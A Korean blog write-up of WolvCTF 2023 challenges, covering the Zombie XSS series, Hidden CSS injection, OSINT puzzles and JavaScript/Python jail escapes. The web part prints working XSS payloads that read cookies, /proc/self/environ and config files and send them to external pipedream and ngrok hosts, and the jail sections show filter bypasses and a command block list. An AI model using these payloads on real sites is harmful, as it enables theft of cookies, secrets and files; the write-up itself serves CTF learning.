---
title: '[CTF][WolvCTF 2023] Writeup'
author: hoppi
date: 2023-03-21 01:21:00 + 0000
categories: [CTF]
tags: [ctf, wolvctf_2023, web, osint, misc]
---
주말동안 `WolvCTF 2023`에 참여하였습니다. 다른 할 일이 있어서 많은 시간을 들이지는 못했지만 이번에는 web 문제를 한 번씩 찍먹해봐서 다행입니다. 제가 풀어본 문제와 찍먹 했는데 풀지 못했던 것들을 다른 분들의 롸업을 참고하여 적어봅니다.(제가 푼 건 `solved`라고 달아놓았습니다)  

# Web
***


## Zombie 101 (solved)
***
zombie 시리즈는 `모두 같은 소스코드에 필터링 없는 XSS 문제`로 플레그만 가져오면 됩니다. 하지만 문제마다 `config`의 설정이 살짝살짝 다릅니다. 먼저 `bot.js`는 아래와 같습니다. 봇의 쿠키에 플레그가 담겨있습니다.  
```javascript
const zombie = require("zombie")

const browser = new zombie ({
    waitDuration: 5*1000,
    localAddress: 0 // without this, calls to localhost fail!
})

const httpOnly = process.argv[2] === 'true'
const hostname = process.argv[3]
const url = process.argv[4]

browser.setCookie({ name: 'flag', domain: hostname, path:'/', value: process.env.FLAG, httpOnly: httpOnly})

browser.visit(url, function() {
    console.log("Visited: ", url)
})  
```
{: file='bot.js'}
<br/>

`101`의 경우, 아래처럼 `httpOnly`가 `false`이기 때문에 `document.cookie`를 이용하여 플레그를 가져올 수 있습니다.  
```plaintext
configFile: '{"flag": "wctf{redacted}", "httpOnly": false, "allowDebug": true}'
```
{: file='docker-compose.yml'}
<br/>

```python
PAYLOAD = '<script>location.href="https://YOUR_SEVER/?f="%252bdocument.cookie</script>'
```
{: file="z1.py"}
<br/>

![z1](../../../assets/img/2023-03-20/z1.png){: w="700" h="350" }  
<br/>


## Zombie 201 (solved)
***

`201`의 `config`는 다음과 같습니다. 이번에는 `httpOnly`가 `true`이기 때문에 `document.cookie`는 안됩니다.
```plaintext
configFile: '{"flag": "wctf{redacted}", "httpOnly": true, "allowDebug": true}'
```
{: file='docker-compose.yml'}
<br/>

`index.js`를 보면 `/debug` 엔드포인트가 존재하는데 `config.allowDebug`가 `true`면 요청 헤더를 모두 보여줍니다.  
```javascript
//index.js: 56

// useful for debugging cloud deployments
app.get('/debug', function(req, res) {
    if (config.allowDebug) {
        res.send({"remote-ip": req.socket.remoteAddress, ...req.headers})
    }
    else {
        res.send('sorry, debug endpoint is not enabled')
    }
})

...
```
{: file="index.js"}
<br/>

따라서 `fetch()`를 이용하여 아래와 같이 페이로드를 작성할 수 있습니다.  
```python
PAYLOAD = '<script>fetch("/debug").then(function(x){return%2520x.text();}).then(function(xx){location.href="https://eo83ud3n5uavhrd.m.pipedream.net/f="%252bbtoa(xx)})</script>'
```
{: file="z2.py"}
<br/>

봇이 방문한 `/debug`의 응답을 `base64` 디코딩하여 플레그를 얻을 수 있습니다.  
![z2](../../../assets/img/2023-03-20/z2.png){: w="700" h="350" }  
<br/>


## Zombie 301 (solved)
***
이번에는 `allowDebug`가 `false`입니다.  
```plaintext
configFile: '{"flag": "wctf{redacted}", "httpOnly": true, "allowDebug": false}'
```
{: file='docker-compose.yml'}
<br/>

`file` scheme을 이용하여 환경변수에 저장된 값을 읽도록 하였습니다.  
```python
PAYLOAD = '<script>fetch("file:///proc/self/environ").then(function(x){return%2520x.text();}).then(function(xx){location.href="https://eo83ud3n5uavhrd.m.pipedream.net/f="%252bbtoa(xx)})</script>'
```
{: file='z3.py'}
<br/>

![z3](../../../assets/img/2023-03-20/z3.png){: w="700" h="350" }  
<br/>


## Zombie 401 (solved)
***
`401`은 `secret-flag`가 따로 있습니다.
```plaintext
configFile: '{"flag": "find-the-secret-flag" ,"httpOnly": false, "allowDebug": true, "secret-flag": "wctf{redacted}"}'
```
{: file='docker-compose.yml'}
<br/>

이 문제들의 `Dockerfile`을 보면 위의 `configFile`을 `./config.json`에 씁니다. 따라서 이 파일을 읽으면 되겠죠?🙃  
```plaintext
FROM node:19-bullseye-slim

ARG configFile
RUN echo "${configFile}"

RUN mkdir -p /ctf/app
WORKDIR /ctf/app
COPY ./package.json ./
COPY ./package-lock.json ./
RUN npm install

COPY ./ ./
RUN echo "${configFile}" > ./config.json

EXPOSE 80

# run the app as a user who cannot modify the above files
USER node
CMD ["node", "index.js"]

```
{: file='Dockerfile'}
<br/>

```python
PAYLOAD = '<script>fetch("file:///ctf/app/config.json").then(function(x){return%2520x.text();}).then(function(xx){location.href="https://eo83ud3n5uavhrd.m.pipedream.net/f="%252bbtoa(xx)})</script>'
```
{: file='z4.py'}
<br/>

![z4](../../../assets/img/2023-03-20/z4.png){: w="700" h="350" }  
<br/>


## Hidden CSS
***
`public-server.js`와 `private-server.js` 2개의 파일이 주어집니다. public은 단순히 url을 입력하면 봇이 동작하는 부분이고 private은 아래와 같습니다. 제약사항으로는 `/css` 엔드포인트의 쿼리 파라미터인 `prefix`의 길이가 20을 넘겨서는 안됩니다. 또한 `res.setHeader`를 통해서 `Content-Type`을 `text/css`로 명시합니다. 그리고 플레그는 `prefix`와 결합하여 전송됩니다.  
```javascript

const express = require('express');
const app = express();

const FLAG = 'wctf{redacted}'

// To visit me, please use a URL like http://0/css
// since http://localhost/css will NOT work.
app.get('/css', function(req, res) {
    let prefix = '' + req.query.prefix
    console.log('visit to /css?prefix='+prefix)
    for (c of prefix) {
        const charCode = c.charCodeAt(0)
        if (charCode < 32 || charCode > 126) {
            prefix = 'illegal characters seen'
            break
        }
    }

    if (prefix.length > 20) {
        prefix = 'your prefix is too long'
    }

    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('Content-Type', 'text/css');
    res.send(prefix + FLAG);
});

const port = 1337;
app.listen(port, async () => {
    console.log(`Listening on ${port}`)
})

```
{: file="private-server.js"}
<br/>

아래와 같은 요청을 생각할 수 있습니다. 이렇게 보내주면 `p`태그의 css속성으로 `--test`가 정의되고 자연스럽게 뒤에 플레그가 붙겠죠.(한가지 주의할 것은 사용자 정의 속성을 만들때 이름은 `--`로 시작해야 합니다)
```plaintext
http://0:1337/css?prefix=p{--test:
```
<br/>

`getComputedStyle()`를 이용해서 전달받은 요소의 css속성값을 담은 객체를 가져올 수 있고 `getPropertyValue()`로 해당 속성의 값을 얻어올 수 있습니다. 그리고 이 값이 곧 플레그이니 이것을 `ngrok`이나 `requestbin`을 이용하여 넘거줍니다. 공격자가 구성해야할 페이지는 다음과 같습니다.  
```html
<html>
<head>
    <link rel="stylesheet" type="text/css" href="http://0:1337/css?prefix=p{--test:" />
</head>
<body>
<p id="hoppi">hi</p>
<script>
    setTimeout(()=>{
        let flag = getComputedStyle(hoppi).getPropertyValue('--test')
        fetch('https://xxxxxxxxxxxx.jp.ngrok.io/?flag='+flag)
    }, 200)
</script>
</body>
</html>
```
{: file="exploit.html"}
<br/>

조금 신기한 것은 태그 css속성을 정의할 때, `{`로 열어주기만 하고 닫지않았는데 플레그가 온전히 보이는 것을 보면 자동적으로 닫아주는가 봅니다.  
![hidden](../../../assets/img/2023-03-20/hidden.png){: w="700" h="350" }  
<br/>

궁금해서 `http://0:1337/css?prefix=p{content:'`처럼 기존의 `content` 속성을 이용하여 해봤는데 양쪽에 `'`(%22)가 붙는 걸 보면 자동적으로 닫아주게 맞는가 봅니다.  
![content](../../../assets/img/2023-03-20/content.png){: w="700" h="350" }  
<br/>



## Adversal
***
추가예정
<br/>



# OSINT
***


## WannaFlag I: An Introduction (solved)
***
![description1](../../../assets/img/2023-03-20/description1.png){: w="500" h="250" }  
<br/>

아래와 같은 이미지 파일을 제공해줍니다.
![image](../../../assets/img/2023-03-20/image.png){: w="700" h="350" }  
<br/>

문제 설명에서 `Google Maps`에 리뷰를 등록했다고하니 바로 구글 이미지 검색을 통해서 찾아보면 미시간에 있는 `The Cube`라는 조형물입니다.  
![cube](../../../assets/img/2023-03-20/cube.png){: w="700" h="350" }  
<br/>

해당 조형물의 `Google Maps` 리뷰를 최신순으로 보면 아래와 같이 하나의 접속할 수 있는 경로를 줍니다.  
![review](../../../assets/img/2023-03-20/review.png){: w="500" h="250" }  
<br/>

nc 명령어로 접속해보면 처음에는 바로 플레그를 알려주는줄 알았으나 대충 아래의 사진처럼 돈보내라고 합니다. 그리고 `#YourFlagsBelongToUs`라는 해시태그와 `Also all of you John OSINTs on twitter need to leave us alone`라는 메시지를 남겨놓습니다.  
![wannaflag](../../../assets/img/2023-03-20/wannaflag.png){: w="700" h="350" }  
<br/>

바로 트위터를 통해서 해당 계정을 검색하여 트윗에서 `base64`로 인코딩된 플레그를 찾을 수 있었습니다.  
![tweet](../../../assets/img/2023-03-20/tweet.png){: w="700" h="350" }  
<br/>


## WannaFlag II: Payments
***
![description2](../../../assets/img/2023-03-20/description2.png){: w="500" h="250" }  
<br/>

`0x08f5AF98610aE4B93cD0A856682E6319bF1be8a6`를 [이더스캔](https://etherscan.io/)을 이용하여 해당 주소를 검색해보면 아래와 같이 많은 트랜잭션이 있습니다.  
![transaction](../../../assets/img/2023-03-20/transaction.png){: w="700" h="350" }  
<br/>

다른 분들의 풀이를 보니 그래프 그려서 푸셨던데 이렇게 푸는게 합리적인 것 같습니다. 저는 위 사진에서 `out`을 기준으로 살펴봤었는데 아무래도 다 `hex`값이다보니 어질어질하고 어디서 플레그를 얻나 몰랐는데 자금 출처의 찐 주소인 `0x79616B199c930A43f02EFd5DF767cFB6A32943d0`의 `self` 트랜잭션에서 아래와 같이 `Input Data`에서 `utf-8`인코딩으로 보면 플레그를 얻을 수 있습니다.  
![self](../../../assets/img/2023-03-20/self.png){: w="700" h="350" }  
<br/>


## WannaFlag III: Infiltration
***
![description3](../../../assets/img/2023-03-20/description3.png){: w="500" h="250" }  
<br/>

`w4nn4_fl4g`를 구글에 검색해보면 아래와 같이 `reddit`이 나옵니다.  
![reddit](../../../assets/img/2023-03-20/reddit.png){: w="700" h="350" }  
<br/>

`how`게시글을 들어가보면 아래처럼 삭제된 댓글들이 있습니다.  
![deleted](../../../assets/img/2023-03-20/deleted.png){: w="700" h="350" }  
<br/>

저는 여기서 막혔는데 [wayback machine](https://archive.org/web/)을 사용하면 됩니다. 그러면 아래와 같이 댓글을 볼 수 있고 `wanna-flag-d60bf7cd-012a-4fcc-9a4c-e60eca6b653f-tlejfksioa-ul.a.run.app`라는 도메인을 떨궈줍니다.  
![wayback](../../../assets/img/2023-03-20/wayback.png){: w="700" h="350" }  
<br/>

해당 사이트에 접속하여 플레그를 얻을 수 있습니다.  
![spin](../../../assets/img/2023-03-20/spin.png){: w="700" h="350" }  
<br/>

3을 풀어야 4,5가 나와서 이 문제들은 못 본 게 아쉽네요. 4,5에 대한 풀이는 레퍼런스를 참고하시면 되겠습니다😁
<br/>



# Misc
***
## yellsatjavascript (solved)
***
소스코드는 아래와 같습니다. `flag`, `.`, `{example}`는 사용하지 못합니다.  
```javascript
const readline = require("readline");
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// you can run code but you can't access the flag

rl.question(">>> ", (answer) => {
  flag = process.env['flag']
  if (answer.match(/flag/)) {
    console.log(':(');
    process.exit(1);
  }
  if (answer.match(/\./)) {
    console.log('hey, are you trying to access functions? :(');
    process.exit(1);
  }
  if (answer.match(/[{}]/)) {
    console.log('do you think calculators have curly braces? :(');
    process.exit(1);
  }
  eval(answer);
  rl.close();
});

rl.on('close', () => process.exit(0));
```
{: file='chall.js'}
<br/>

자바스크립트의 특성을 이용하여 아래와 같이 우회할 수 있습니다.  
```javascript
console['log'](process['env'])
```
{: file='solution.js'}
<br/>

![javascript](../../../assets/img/2023-03-20/javascript.png){: w="700" h="350" }  
<br/>


## yellsatpython
***
`pyjail`문제였는데 결정적으로 `.`이 필터링 되있어서 일반적인 `''.__class__.__xxx__` 이런건 안되었죠. 그래서 어떻게 해야할지 고민했던 문제입니다.  
```python
#
# Check out my Python calculator!
#

def validate(expression):
  if any([banned in expression for banned in [
    # my friends ran rm -rf / on my computer, so now I have to be careful
    "os",
    "system",
    "breakpoint",
    "sh",
    "vars(",
    "exec(",
    "eval(",
    "input(",
    "getattr",
    # sick and tired of vars shenanigans; no indexing!
    ".",
    "[",
    "]",
    "dict",
  ]]):
    return False
  return True

import sys

expr = input(">>> ")
if not validate(expr):
  print("no")
  sys.exit(0)

# no variables for you!
print(eval(expr, {}, {}))

# hey what does this do
print(vars())
```
{: file="jail.py"}
<br/>

어차피 플레그는 한 줄이니 `next()`를 이용하여 이렇게도 가능하군요!  
```python
next(open("/home/user/flag"+chr(46)+"txt"))
```
{: file='solution.py'}
<br/>

![python](../../../assets/img/2023-03-20/python.png){: w="700" h="350" }  
<br/>


# Reference
- [https://enscribe.dev/ctfs/wolv23/osint/wannaflag/](https://enscribe.dev/ctfs/wolv23/osint/wannaflag/)
- [https://developer.mozilla.org/ko/docs/Web/API/Window/getComputedStyle](https://developer.mozilla.org/ko/docs/Web/API/Window/getComputedStyle)